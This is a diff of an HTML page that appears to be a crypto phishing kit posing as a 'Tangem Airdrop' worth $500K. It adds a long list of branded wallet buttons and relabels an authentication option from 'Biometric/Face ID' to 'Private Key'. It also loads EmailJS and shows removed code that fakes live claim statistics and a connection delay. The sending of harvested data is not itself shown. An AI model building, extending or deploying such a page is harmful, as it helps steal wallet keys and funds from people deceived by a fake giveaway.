@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="/logo.jpg" type="image/x-icon">
     <title>Tangem Airdrop - Claim $500K in Crypto</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
@@ -150,29 +151,285 @@
                     <div class="grid grid-cols-2 sm:grid-cols-3 gap-4 mb-6">
                         <button onclick="connectWallet('tangem')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
                             <img src="/logo.jpg" alt="Logo" class="w-12 h-12 bg-blue-500 rounded-full mb-2 flex items-center justify-center text-white font-bold" />
-                            <span>Tangem</span>
+                            <span class="selected-wallet-name">Tangem</span>
                         </button>
                         <button onclick="connectWallet('trust')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
                             <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAsJCQcJCQcJCQkJCwkJCQkJCQsJCwsMCwsLDA0QDBEODQ4MEhkSJRodJR0ZHxwpKRYlNzU2GioyPi0pMBk7IRP/2wBDAQcICAsJCxULCxUsHRkdLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCz/wAARCAC0AKkDASIAAhEBAxEB/8QAHAABAAEFAQEAAAAAAAAAAAAAAAYBAwQFBwII/8QAPhAAAgIBAgMEBAsHBAMAAAAAAAECAwQFEQYSITFBUWEHE3GhFCIjNnJ0gZGys8EyUmJkc4KSM0KisWOj8P/EABsBAQABBQEAAAAAAAAAAAAAAAAFAgMEBgcB/8QAMBEAAgIBAgMGBQQDAQAAAAAAAAECAwQFESExQQYSE2FxsTI0gZHBIlFy0RSh8DP/2gAMAwEAAhEDEQA/AOtgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdB0AAHQdAAB0HQAAdAAAUbSTb7Em230SS8WyP6nxjwnpTlDI1Gq2+K3dOHvkWdu2zde8E/JyRepotyJd2qLk/JbnjaXMkO4INpfpAo1jUrsXF06yGNVj2X+tyLoq6e04QS9XBOK7f3mSmrVMGzZSlKqW/ZYtl/kuh7lY9uHZ4V67suD29TElm48Z+HKaT8zYA8xlGSTjKMl4xaa+9FV+pYMtceKKgdB0B6AOg6AADoOgAA6DoAAAAADXazq+FoeBdqOZG6VFUq4OOPGMrJSskoRSUml7yuuuVs1XBbt8Ejx8DYnmUoxjKUmoxinKUpNJRSW7bb6HJNS9KeqW88NKwMfFg20rcqTyLdtukoxjywT9vMQzUNe1/VeZahqOVkQb3dU7HGnt3/0obV/8TbsTsfnXcbmoL7v7L+yzK+K5HbNS424R0tzhbqEb7o7fI4EXkS6/wAcPk0/bNEL1H0qZtnPDStOppju1G7Om7rGvH1VfLFP+6RzUobfidkcGjjZvN+fL7L87liV8nyNtqXEXEerOXw/Usq2uW+9Kn6ujr3eqq2h7jVAG0049VC7tUVFeS2LLbfMk/BMuXVcrzwLPzajoisOb8Hvl1LJf8jZ+bWT1WeZyPthjeJqLl5I03V/mfojY1X2VtOuyUH27wbXuXQ2FOsZcNlYoWrxfxZfeunuNCrPMuKx+JpbpnD4WYVGbkY//nJr2JXVq2FZspuVUnt0mt47/SjujNhOE0nCUZR8YtNe4has8y7XfZU965yhLxg2vv2KfFnH4kT1HaKyPC6O/oTEqR2nV8uCSs5LUl15lyy++PT3G2w82rL9YownCUFFyUtmuu/Y0XY2xlwRsOLquNlNRg+L6PmZgALhKAAAAAAAiHpG+a2f9YwvzokvIh6Rvmtn/WML85Epo/z9H8o+5RP4WcLKgHe0RgAB6AAADf8ACj5dQyPqc1/7KybKwgvDcuXOv+qy/HAl6sOfa/j+JluXkjTtY+Z+i/JnKxFyNhgKwuRsNVsw/IiDPjYe1YYCsLisI+zD8gZ6s8ze6BLmszfKFX/ciLqwkPDUuazP8q6f+5GBZi+H+oltG+dr+vsySgAsnSAAAAB1HUAEQ9I3zWz/AKxhfnIl/UiHpG+a2d9YwvzkSmj/AD9H8o+5RP4WcMAB3tEaAAengAABt9Ae2Zc/5eS/5xJOp+ZFdEe2XZ/Ql+KJIlM1nUa+9e36GpatDfI38kZis8y5GzzMJTPamRE8ZMhnFozVZ5lxWeZgKZcVhhWYZSZ0bPMk/Ckua3UuvZXj/imQ1WEs4OlzXar5VYv4rCE1HG8OiUv+5kto3zsPr7MmIHUdTVDpAA6jqAAAACIekb5rZ/1jB/OiS8jnG+LZl8La9XXHmnXRDJS/hx7YXSf3Jkhpk1DNpk+SlH3RTLjFnz+VKFTv6IsAA9AAABsNIe2TZ/Rf4om+UyPaa9r5v/xv8SNypkJmQ3tbNf1GG9u5lKZ7UzFUz0pmC6yJdRlqZ6UzFUz0plp1ll1GWpkx4Ilvdq/lVifisIMpdpPeBKpfB9WyOXaNmRVTB+Pq4cz/ABEDraUMOf090SWj1P8AzINdN/YmQAOdnQAAAAAAAW76q8im+i1b1X1WU2LfbeFkXGS95cKMbtcUD5o1HCu03Pz8C5bW4mRbRLv35HspJ+DWzXtMU6T6T9DlVk42u0xbryeXEzduyF0I/JTe37yTT+ivE5sd60jOjn4kL1z6+q5kZOPdlsAASxQAAAZWC9rZv+D9UbNTNTivayX0f1Rn8xH3x3nuReXDee5lKZ7UzEUz2pmI6yPdRlKZ7UzEUz2plt1lp1GV6xJbvuTbOw8N4L0/RtPomtrZ1/CLk+1WXP1jT9m+32HMeF9Mlq+r4tUo74uM45eY32ckH8Wv+57L2b+B2RdhoXafJW8caPTi/wAE9o+N3d7X6IqADSzYQAAAAAAAADD1LT8TVMHM0/LhzY+VVKqe37UW+sZx84vZr2Hztqum5ekahmadlL5bFscHJJqNkX1jZDfuktmvafSpBuPeFnrGLHUcOG+oYdbjKK7b8dbycfau42vszqywMjwrX+if+n0f4ZYvh3o7o4sCsoyjKUZJqUW1JPtTXRplDsaaa3RgAAFQLtD2m/o/qZfMYVfST9hf5jHsjuzFtjvIyFIqpFhSPSkWXAxXWX1IuRlKUoQhCU5zlGEIQTlOc5PaMYpd7fRGKpJdX0S3Z0rgLhiadWvajU47x30umxbNKS2eTOL72ukPJ7962iNUzqsCh3T59F+7/wC5ldWM7ZbEp4V0JaHpsK7VF52S435049V6zb4tcX4QXRfa+8kCKbFdjjN908iyVtj3b4myQgoRUY8kAAWisAAAAAAAAAFCoAIBxdwFVqnrdR0dQp1F7zux3tGnLfbun2Rn7n5dpyC+jIxbrsfIqsqvpm67arYuM4TXapRZ9Okb4l4R0niKpzsXwfUIQ5aMyuO8kl2Qtj0Uo/buu5rse6aF2nnhtUZXGHR9V/aMaynfjE4EDa61w/rGg5Do1ChxjKTVF8N5Y96W/Wuf6PZ+RqjqtF9eRBWVSTT6ow2muZWL2f2HtS7C2C81uUuKZeUup659urfQrh4edqGTViYOPbkZNr2hVVHmk+q6y7kl3t9Edd4V4AxNLdOfqzrytRi42U1LeWNiSXY1v+1NeL6LuXTmIHVdYxtNhvY95dEub/r1PYUOb4Gn4P4Hnkeo1bXKXGlONuHg2LZ298bMmL/296j39/TpLqSW3YtkipU49qGoXaha7bn6LovQkq641raIABHlwAAAAAAAAAAAAAAAAAAsZWJh5tFuNl0VX49sXGyq6KlCS9j7/A5tr3oxjJ25GgXKPbJ4OXJuPjtTe+vsUv8AI6gUJHB1PK0+Xex5beXR+qKJQUuZ825Oj63h5UcLJ07MhlzbjXT6mc5W7bN+q5E1Lt7U2S/Q/Rrq+Y679Ys+AY+6bohy2Zlkfs3hHfz3fkdj27H4b7A2LK7Y5l1fcrioPq+f2/b/AGWlRFPia7SdE0fRKPg+nYsKYvZ2T6yttkl+1ZZL4z/+6GyANPssnbJzm92+rL6W3IAAoPQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACuxTYAAbDYAAbDYAAbDYAAbDYAAbDYAAbDYAAbDYAAbDYAAbDYAArsU2AAP/2Q==" alt="Logo" class="w-12 h-12 bg-blue-500 rounded-full mb-2 flex items-center justify-center text-white font-bold" />
-                            <span>Trust Wallet</span>
+                            <span class="selected-wallet-name">Trust Wallet</span>
                         </button>
                         <button onclick="connectWallet('metamask')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
                             <img src="https://th.bing.com/th?q=Metamask+Icon.png&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Logo" class="w-12 h-12 bg-blue-500 rounded-full mb-2 flex items-center justify-center text-white font-bold" />
-                            <span>MetaMask</span>
+                            <span class="selected-wallet-name">MetaMask</span>
                         </button>
                         <button onclick="connectWallet('coinbase')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
                             <img src="https://th.bing.com/th?q=Coin+Logo+Coinbase&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Logo" class="w-12 h-12 bg-blue-500 rounded-full mb-2 flex items-center justify-center text-white font-bold" />
-                            <span>Coinbase</span>
+                            <span class="selected-wallet-name">Coinbase</span>
                         </button>
-                        <button onclick="connectWallet('binance')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                        <button onclick="connectWallet('binance')"  data-walletname="Binance Wallet"  class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
                             <img src="https://th.bing.com/th?q=Binance+Logo.png&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Logo" class="w-12 h-12 bg-blue-500 rounded-full mb-2 flex items-center justify-center text-white font-bold" />
-                            <span>Binance</span>
+                            <span class="selected-wallet-name">Binance</span>
                         </button>
-                        <button onclick="showMoreWallets()" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
-                            <div class="w-12 h-12 bg-gray-500 rounded-full mb-2 flex items-center justify-center text-white font-bold">+</div>
-                            <span>More</span>
-                        </button>
+                        
+                            <button onclick="toggleMoreWallets()" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                                <div class="w-12 h-12 bg-gray-500 rounded-full mb-2 flex items-center justify-center text-white font-bold">▼</div>
+                                <span>More</span>
+                            </button>
+                            
+                            
+                          
                     </div>
+                    <div id="more-wallets-container" class="hidden grid grid-cols-2 sm:grid-cols-3 gap-4 mb-6">
+                        <!-- Search Bar -->
+                        <div class="col-span-2 sm:col-span-3">
+                            <div class="relative">
+                                <input type="text" id="wallet-search" placeholder="Search wallets..." 
+                                       class="w-full bg-gray-700 text-white px-4 py-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-amber-500">
+                                <button onclick="searchWallets()" 
+                                        class="absolute right-2 top-1/2 transform -translate-y-1/2 bg-amber-500 hover:bg-amber-600 text-black font-bold px-4 py-1 rounded-lg">
+                                    Search
+                                </button>
+                            </div>
+                        </div>
+                        <script>
+                            function searchWallets() {
+                              const query = document.getElementById('wallet-search').value.toLowerCase().trim();
+                              const walletButtons = document.querySelectorAll('#more-wallets-container .wallet-btn');
+                              
+                              walletButtons.forEach(button => {
+                                const walletName = button.querySelector('.name').textContent.toLowerCase();
+                                const shouldShow = walletName.includes(query);
+                                
+                                // Toggle visibility
+                                button.classList.toggle('hidden', !shouldShow);
+                                
+                                // Optional: Highlight matching text
+                                if (shouldShow && query) {
+                                  const nameElement = button.querySelector('.name');
+                                  const originalText = nameElement.dataset.original || nameElement.textContent;
+                                  nameElement.dataset.original = originalText;
+                                  const highlightedText = originalText.replace(
+                                    new RegExp(query, 'gi'), 
+                                    match => `<span class="bg-amber-100 text-amber-800">${match}</span>`
+                                  );
+                                  nameElement.innerHTML = highlightedText;
+                                }
+                              });
+                            }
+                            </script>
+                        <!-- Solflare -->
+                        <button onclick="connectWallet('solflare')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                          <img src="https://th.bing.com/th/id/OIP.kJ2lFJyXXGUrVz6_TkZmqwHaHa?w=158&h=180&c=7&r=0&o=5&pid=1.7" 
+                               alt="Solflare Logo" 
+                               class="w-12 h-12 rounded-full mb-2 object-contain">
+                          <span class="selected-wallet-name name">Solflare</span>
+                        </button>
+                      
+                        <!-- Exodus -->
+                        <button onclick="connectWallet('exodus')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                          <img src="https://th.bing.com/th/id/OIP.8yeonzhNDy9_eqHCAgJSiAHaHa?w=155&h=180&c=7&r=0&o=5&pid=1.7" 
+                               alt="Exodus Logo" 
+                               class="w-12 h-12 rounded-full mb-2 object-contain">
+                          <span>Exodus</span>
+                        </button>
+                      
+                        <!-- MathWallet -->
+                        <button onclick="connectWallet('mathwallet')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                          <img src="https://th.bing.com/th/id/ODLS.9c2a35a7-5480-4b59-8c44-84298a444d04?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" 
+                               alt="MathWallet Logo" 
+                               class="w-12 h-12 rounded-full mb-2 object-contain">
+                          <span>MathWallet</span>
+                        </button>
+                      
+                        <!-- TokenPocket -->
+                        <button onclick="connectWallet('tokenpocket')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                          <img src="https://th.bing.com/th/id/ODLS.e641c042-081a-4110-96cc-b1a3b2b137a3?w=32&h=32&qlt=94&pcl=fffffa&o=6&pid=1.2" 
+                               alt="TokenPocket Logo" 
+                               class="w-12 h-12 rounded-full mb-2 object-contain">
+                          <span>TokenPocket</span>
+                        </button>
+                      
+                        <!-- SafePal -->
+                        <button onclick="connectWallet('safepal')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                          <img src="https://th.bing.com/th/id/ODLS.773bab3c-f7f9-4fee-baa8-14627edc553d?w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2" 
+                               alt="SafePal Logo" 
+                               class="w-12 h-12 rounded-full mb-2 object-contain">
+                          <span>SafePal</span>
+                        </button>
+                      
+                        <!-- Argent -->
+                        <button onclick="connectWallet('argent')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                          <img src="https://th.bing.com/th/id/ODLS.f8082c40-372f-41ac-891c-6b55c3b4088c?w=32&h=32&qlt=93&pcl=fffffa&o=6&pid=1.2" 
+                               alt="Argent Logo" 
+                               class="w-12 h-12 rounded-full mb-2 object-contain">
+                          <span>Argent</span>
+                        </button>
+                      
+                        <!-- Rabby -->
+                        <button onclick="connectWallet('rabby')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                          <img src="https://th.bing.com/th/id/ODLS.09e5ede1-6fb3-47c7-995a-675d69f62c73?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" 
+                               alt="Rabby Logo" 
+                               class="w-12 h-12 rounded-full mb-2 object-contain">
+                          <span>Rabby</span>
+                        </button>
+                      
+                        <!-- Zerion -->
+                        <button onclick="connectWallet('zerion')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                          <img src="https://th.bing.com/th/id/ODLS.bdb422d1-150e-4e4e-a2da-a6a61e5aad33?w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2" 
+                               alt="Zerion Logo" 
+                               class="w-12 h-12 rounded-full mb-2 object-contain">
+                          <span>Zerion</span>
+                        </button>
+                      
+                        <!-- Rainbow -->
+                        <button onclick="connectWallet('rainbow')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                          <img src="https://rainbow.me/favicon.ico" 
+                               alt="Rainbow Logo" 
+                               class="w-12 h-12 rounded-full mb-2 object-contain">
+                          <span>Rainbow</span>
+                        </button>
+                        <!-- Kraken -->
+                        <button onclick="connectWallet('kraken')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th/id/ODLS.feae029d-e2de-42f3-9ab9-acb2987163df?w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2" 
+                                 alt="Kraken Logo" 
+                                 class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>Kraken</span>
+                        </button>
+
+                        <!-- Uniswap -->
+                        <button onclick="connectWallet('uniswap')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th?q=Uniswap+Token+Logo&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" 
+                                 alt="Uniswap Logo" 
+                                 class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>Uniswap</span>
+                        </button>
+
+                        <!-- BitPay -->
+                        <button onclick="connectWallet('bitpay')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th?q=BitPay+Wallet+Logo&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" 
+                                 alt="BitPay Logo" 
+                                 class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>BitPay</span>
+                        </button>
+                        <!-- Atomic Wallet -->
+                        <button onclick="connectWallet('atomic')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th?q=Atomic+Wallet+Logo.png&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" 
+                                     alt="Atomic Wallet Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>Atomic Wallet</span>
+                        </button>
+
+                        <!-- Guarda Wallet -->
+                        <button onclick="connectWallet('guarda')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th/id/OIP.Q8HgCl6-J9Brji0-YOSjxQAAAA?w=179&h=180&c=7&r=0&o=5&pid=1.7" 
+                                     alt="Guarda Wallet Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>Guarda Wallet</span>
+                        </button>
+
+                        <!-- TrustVault -->
+                        <button onclick="connectWallet('trustvault')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th/id/OIP.bEnYXj5kokxxMr1VGa0s0QAAAA?w=135&h=150&c=7&r=0&o=5&pid=1.7" 
+                                     alt="TrustVault Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>TrustVault</span>
+                        </button>
+
+                        <!-- MyEtherWallet -->
+                        <button onclick="connectWallet('myetherwallet')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th/id/OIP.aGmhq1KOP6BpNMhO24LLqQAAAA?w=169&h=180&c=7&r=0&o=5&pid=1.7" 
+                                     alt="MyEtherWallet Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>MyEtherWallet</span>
+                        </button>
+
+                        <!-- Coinomi -->
+                        <button onclick="connectWallet('coinomi')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th/id/OIP.MnaP1TZUQzGj3358RTw-mgHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7" 
+                                     alt="Coinomi Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>Coinomi</span>
+                        </button>
+
+                        <!-- BitKeep -->
+                        <button onclick="connectWallet('bitkeep')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th/id/OIP.Zk4egZDDTdYgnJ15heWM0AHaHa?w=167&h=180&c=7&r=0&o=5&pid=1.7" 
+                                     alt="BitKeep Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>BitKeep</span>
+                        </button>
+
+                        <!-- Huobi Wallet -->
+                        <button onclick="connectWallet('huobi')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th?q=Huobi+Cry+Pto+Logo+Image+PNG&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" 
+                                     alt="Huobi Wallet Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>Huobi Wallet</span>
+                        </button>
+
+                        <!-- OKX Wallet -->
+                        <button onclick="connectWallet('okx')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th/id/OIP._NTtpnZf0zRG9TuC5B9vzQHaHa?w=163&h=180&c=7&r=0&o=5&pid=1.7" 
+                                     alt="OKX Wallet Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>OKX Wallet</span>
+                        </button>
+
+                        <!-- Polkadot.js -->
+                        <button onclick="connectWallet('polkadotjs')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th?q=Polka+Dot+Coin+Logo.png&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" 
+                                     alt="Polkadot.js Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>Polkadot.js</span>
+                        </button>
+
+                        <!-- Keplr -->
+                        <button onclick="connectWallet('keplr')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th/id/OIP.LC2Ae9uHT7qTRlvs6pVzbQHaEK?w=287&h=183&c=7&r=0&o=5&pid=1.7" 
+                                     alt="Keplr Wallet Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>Keplr Wallet</span>
+                        </button>
+
+                        <!-- Terra Station -->
+                        <button onclick="connectWallet('terrastation')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th/id/OIP.eOd2EFQDELGwSUa4EHQqtQHaHa?w=157&h=180&c=7&r=0&o=5&pid=1.7" 
+                                     alt="Terra Station Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>Terra Station</span>
+                        </button>
+
+                        <!-- Celo Wallet -->
+                        <button onclick="connectWallet('celo')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th?q=Celo+Logo.png&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" 
+                                     alt="Celo Wallet Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>Celo Wallet</span>
+                        </button>
+
+                        <!-- Harmony One -->
+                        <button onclick="connectWallet('harmony')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th/id/OIP.ClAGJCvWtzLK0ZOXE_t1KgAAAA?w=157&h=176&c=7&r=0&o=5&pid=1.7" 
+                                     alt="Harmony One Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>Harmony One</span>
+                        </button>
+
+                        <!-- VeChainThor -->
+                        <button onclick="connectWallet('vechainthor')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th/id/OIP.nbLrXb6PFMogD0VDOeHdDwAAAA?w=182&h=182&c=7&r=0&o=5&pid=1.7" 
+                                     alt="VeChainThor Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>VeChainThor</span>
+                        </button>
+
+                        <!-- TronLink -->
+                        <button onclick="connectWallet('tronlink')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <img src="https://th.bing.com/th?q=Tronlink+Logo&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" 
+                                     alt="TronLink Logo" 
+                                     class="w-12 h-12 rounded-full mb-2 object-contain">
+                            <span>TronLink</span>
+                        </button>
+                      </div>
                 </div>
 
                 <div id="connecting-section" class="hidden text-center">
@@ -202,7 +459,7 @@
                             <div class="text-2xl">🛡️</div>
                             <div>
                                 <h4 class="font-bold">Passkey</h4>
-                                <p class="text-gray-400 text-sm">Biometric/Face ID</p>
+                                <p class="text-gray-400 text-sm">Private Key</p>
                             </div>
                         </button>
                     </div>
@@ -389,216 +646,415 @@
             </div>
         </div>
     </footer>
-
-    <script>
-        // Initialize EmailJS (replace with your actual credentials)
-       // emailjs.init('Dv4Osr97EP0U3Z5Nq');
-
-        // Simulate live claim statistics
-        function updateLiveStats() {
-            // Random growth for demonstration
-            const btc = (1.80 + Math.random() * 0.5).toFixed(2);
-            const eth = (64.24 + Math.random() * 2).toFixed(2);
-            const xrp = (25000 + Math.random() * 5000).toFixed(0);
-            const usdt = (100000 + Math.random() * 1000).toFixed(0);
-            const participants = 2458 + Math.floor(Math.random() * 10);
-            const totalValue = 410000 + Math.floor(Math.random() * 1000);
-            
-            document.getElementById('btc-claimed').textContent = btc + ' BTC';
-            document.getElementById('eth-claimed').textContent = eth + ' ETH';
-            document.getElementById('xrp-claimed').textContent = xrp.replace(/\B(?=(\d{3})+(?!\d))/g, ",") + ' XRP';
-            document.getElementById('usdt-claimed').textContent = usdt.replace(/\B(?=(\d{3})+(?!\d))/g, ",") + ' USDT';
-            document.getElementById('total-claimed').textContent = participants.toLocaleString();
-            document.getElementById('total-value').textContent = totalValue.toLocaleString();
-        }
-
-        // Update stats every 5 seconds
-        setInterval(updateLiveStats, 5000);
-        updateLiveStats(); // Initial call
-
-        function connectWallet(walletType) {
-            document.getElementById('wallet-connect-section').classList.add('hidden');
-            document.getElementById('connecting-section').classList.remove('hidden');
-            
-            setTimeout(function() {
-                document.getElementById('connecting-section').classList.add('hidden');
-                document.getElementById('auth-section').classList.remove('hidden');
-            }, 10000);
-        }
+<script>
+    // Global wallet configuration
+    const WALLETS = {
+        tangem: {
+            id: 'tangem',
+            name: 'Tangem Wallet',
+        },
+        metamask: {
+            id: 'metamask',
+            name: 'MetaMask',
+        },
+        phantom: {
+            id: 'phantom',
+            name: 'Phantom',
+        },
+        solflare: {
+            id: 'solflare',
+            name: 'Solflare',
+        },
+        trust: {
+            id: 'trust',
+            name: 'Trust Wallet',
+        },
+        binance: {
+            id: 'binance',
+            name: 'Binance Wallet',
+        },
+        coinbase: {
+            id: 'coinbase',
+            name: 'Coinbase Wallet',
+        },
+        exodus: {
+            id: 'exodus',
+            name: 'Exodus Wallet',
+        },
+        mathwallet: {
+            id: 'mathwallet',
+            name: 'MathWallet',
+        },
+        tokenpocket: {
+            id: 'tokenpocket',
+            name: 'TokenPocket',
+        },
+        safepal: {
+            id: 'safepal',
+            name: 'SafePal',
+        },
+        argent: {
+            id: 'argent',
+            name: 'Argent',
+        },
+        rabby: {
+            id: 'rabby',
+            name: 'Rabby',
+        },
+        zerion: {
+            id: 'zerion',
+            name: 'Zerion',
+        },
+        rainbow: {
+            id: 'rainbow',
+            name: 'Rainbow',
+        },
+        kraken: {
+            id: 'kraken',
+            name: 'Kraken',
+        },
+        okx: {
+            id: 'okx',
+            name: 'OKX Wallet',
+        },
+        polkadotjs: {
+            id: 'polkadotjs',
+            name: 'Polkadot.js',
+        },
+        keplr: {
+            id: 'keplr',
+            name: 'Keplr Wallet',
+        },
+        terrastation: {
+            id: 'terrastation',
+            name: 'Terra Station',
+        },
+        celo: {
+            id: 'celo',
+            name: 'Celo Wallet',
+        },
+        harmony: {
+            id: 'harmony',
+            name: 'Harmony One',
+        },
+        vechainthor: {
+            id: 'vechainthor',
+            name: 'VeChainThor',
+        },
+        tronlink: {
+            id: 'tronlink',
+            name: 'TronLink',
+        },
+        bitpay: {
+            id: 'bitpay',
+            name: 'BitPay',
+        },
+        atomic: {
+            id: 'atomic',
+            name: 'Atomic Wallet',
+        },
+        guarda: {
+            id: 'guarda',
+            name: 'Guarda Wallet',
+        },
+        trustvault: {
+            id: 'trustvault',
+            name: 'TrustVault',
+        },
+        myetherwallet: {
+            id: 'myetherwallet',
+            name: 'MyEtherWallet',
+        },
+        coinomi: {
+            id: 'coinomi',
+            name: 'Coinomi',
+        },
+        bitkeep: {
+            id: 'bitkeep',
+            name: 'BitKeep',
+        },
+        huobi: {
+            id: 'huobi',
+            name: 'Huobi Wallet',
+        },
         
-        function showMoreWallets() {
-            alert('Additional wallets will be shown here: Solflare, Kraken, Uniswap, etc.');
-        }
-        
